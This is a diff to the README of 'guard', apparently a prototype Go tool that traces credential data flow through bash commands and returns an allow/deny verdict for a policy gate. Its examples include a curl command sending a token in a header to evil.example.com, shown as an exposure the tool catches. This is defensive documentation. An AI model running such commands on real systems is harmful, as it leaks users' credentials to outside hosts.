@@ -1,28 +1,35 @@
 # guard
 
 A prototype data flow analyzer for bash commands. It parses a command into an
-AST, traces where security-sensitive data comes from and where it ends up, and
-reports the path it took.
+AST, traces where security-sensitive data comes from and where it ends up,
+reports the path it took, and decides whether to **allow or deny** the command.
 
 ```
-$ ./guard 'TOKEN=$(gh auth token); curl -s -H "Authorization: Bearer $TOKEN" https://api.github.com/repos/example-org/example-repo/issues/833'
+$ ./guard 'curl -s -H "Authorization: Bearer $(gh auth token)" https://api.github.com/x'
 
-command
-  TOKEN=$(gh auth token); curl -s -H "Authorization: Bearer $TOKEN" https://api.github.com/repos/example-org/example-repo/issues/833
+commands
+  [1] gh auth token                          fully understood
+      no sensitive data enters here
+  [2] curl                                   fully understood
+        -s                               switch
+        -H                               flag
+        "Authorization: Bearer $(gh a... value of -H            -> auth slot
+        https://api.github.com/x         positional             -> url slot
+      receives sensitive data, emits to the network
 
 data flow
   [1] gh auth token
       prints the GitHub CLI's stored OAuth token
-      `gh auth token` (8:21)
-        -> captured by command substitution               `$(gh auth token)` (6:22)
-        -> assigned to $TOKEN                             `TOKEN=$(gh auth token)` (0:22)
-        -> expanded as $TOKEN                             `$TOKEN` (58:64)
-        -> used as curl -H (auth slot)                    `"Authorization: Bearer $TOKEN"` (35:65)
+        -> captured by command substitution   `$(gh auth token)` (34:50)
+        -> used as curl -H (auth slot)        `"Authorization: Bearer $(gh...)"` (11:51)
       INTENDED USE: reaches the network
-      auth slot -- authenticates the request -- this is what a credential is for
 
-summary
-  1 flow(s) traced to a sink: 0 exposed, 1 intended use
+verdict
+  ALLOW
+    - every command carrying sensitive data is fully accounted for
+    - credential used in an auth slot of curl -H -- intended use
+  caveat: destination hosts are not modelled, so a credential sent to an
+          untrusted host is indistinguishable from one sent to a trusted host.
 ```
 
 ## Usage
@@ -31,8 +38,14 @@ summary
 go build -o guard .
 
 ./guard '<bash command>'          # human-readable report
-./guard -json '<bash command>'    # the flow graph as JSON
+./guard -json '<bash command>'    # coverage, flow graph and verdict as JSON
+./guard -q '<bash command>'       # verdict through the exit code only
 echo '<bash command>' | ./guard   # read from stdin
+
+# exit codes are the interface for a policy gate
+#   0  ALLOW
+#   1  DENY  -- including a command that cannot be parsed
+#   2  usage error
 
 go test ./...                     # the test suite
 ./probes/run.sh                   # re-run the parser comparison below
@@ -134,6 +147,53 @@ $ ./guard 'curl -H "X-Data: $TOKEN" https://evil.example.com'
   ... content slot ... 1 exposed, 0 intended use
 ```
 
+## The allow/deny rule
+
+Knowing where data went is not enough to decide. It also matters whether every
+part of the command it passed through was **accounted for** — an unmodelled
+flag could route that data somewhere the analyzer never looked.
+
+So each command is checked against the knowledge base twice: is the program
+known, and is every flag it was given known? The answer is printed in the
+`commands` section of every report, and the verdict follows from it:
+
+> **DENY** when sensitive data reached a slot that exposes it.
+> **DENY** when sensitive data *entered* a command — through an argument or
+> through stdin — that the knowledge base does not fully account for.
+> Otherwise **ALLOW**.
+
+A gap only matters when data flows through it. `ls -lah --color=auto` has four
+flags outside the table and is allowed, because nothing sensitive reaches it.
+The same gap denies the moment it does:
+
+```
+$ ./guard 'curl -Z ok https://x.com'        ALLOW
+$ ./guard 'curl -Z "$TOKEN" https://x.com'  DENY
+    - sensitive data enters `curl`, and the knowledge base does not
+      account for: -Z
+```
+
+Data a command *produces* does not count as entering it — `gh auth token`
+printing a credential is the command doing its job, and the analyzer goes on
+to trace where that credential lands.
+
+### Arity is separate from slot
+
+`FlagSpec` carries two independent facts: whether a flag consumes the next
+word, and where that value lands. Arity is what the parser needs to tokenize
+correctly; the slot is what the classifier needs to judge. Getting arity wrong
+is silent — if `-o` did not consume its argument, `curl -o "$TOKEN" https://x`
+would report the token as a URL.
+
+This is also why switches are declared. `curl -s` is in the table not because
+it does anything interesting, but because an *undeclared* flag is a gap, and a
+gap denies as soon as data flows through the command.
+
+Two flags are left out on purpose. `sed -i` is a switch on GNU sed and takes a
+suffix on BSD sed; an ambiguous arity is a real gap, so it denies rather than
+being guessed at. `xargs` and `timeout` are absent as programs for the same
+reason — they run something else that the analyzer does not descend into.
+
 ### Sources
 
 Three kinds, in decreasing order of confidence:
@@ -210,8 +270,25 @@ truncated in the capture. The remaining 35 break down as:
 The corpus itself is not in this repository, so unlike the parser comparison
 these numbers are not reproducible from a clean checkout.
 
-The corpus is also what drove the redirect, `export` and filter handling
-above. Their effect on the same 129,915 commands:
+The same corpus drove the coverage tables. Denying on unaccounted-for parts
+started at a 14.1% deny rate, whose largest single driver was a bug: `head -20`
+was read as a cluster of flags `-2` and `-0`. Fixing numeric short options and
+giving the filter set its flags brought it to **2.63%** of unique commands
+(2.15% of invocations), and what remains is honest:
+
+| top deny driver | invocations |
+|---|---|
+| `xargs` (unknown program) | 3,504 |
+| `safeoutputs` (unknown program) | 463 |
+| `deadcode`, `read`, `bc`, `python3`, `timeout` | ~940 combined |
+| `[` — the test builtin, flags not modelled | ~395 |
+| `gh pr review` — not modelled as a sink | ~91 |
+
+That list *is* the roadmap: it names exactly which knowledge would pay for
+itself next, in invocation order.
+
+The corpus also drove the redirect, `export` and filter handling above. Their
+effect on the same 129,915 commands:
 
 | | before | after |
 |---|---|---|
@@ -236,9 +313,16 @@ than one that has none.
   a function is not linked back to its definition.
 - **Wrapper commands are not unwrapped.** `xargs curl -d`, `timeout 30 curl`
   and `python3 -c "..."` run another program that the analyzer does not
-  descend into. These are left deliberately unknown so that they are reported
-  rather than cleared — `xargs` alone accounts for 3,225 of the remaining
-  unknown-command notes.
+  descend into. These are left deliberately unknown, so they deny when data
+  flows through them — `xargs` alone drives 3,504 of the denials above.
+- **No destination model.** `curl -H "Authorization: Bearer $TOKEN"` is allowed
+  whether the host is `api.github.com` or `evil.com`. Under an allow/deny
+  regime this is the most consequential gap, so the verdict prints it as a
+  caveat rather than leaving it implicit. Host allowlisting would be the next
+  layer.
+- **Flag tables are hand-written and partial.** curl has 258 flags; the table
+  declares the ones that matter plus the common switches. Arity for a full
+  table would be generated from `--help` or shell completions, not typed out.
 - **No value computation.** The analyzer knows a word carries a credential; it
   never knows which one, and cannot tell `https://api.github.com` from
   `https://evil.com`. Destination allowlisting would be a separate layer.
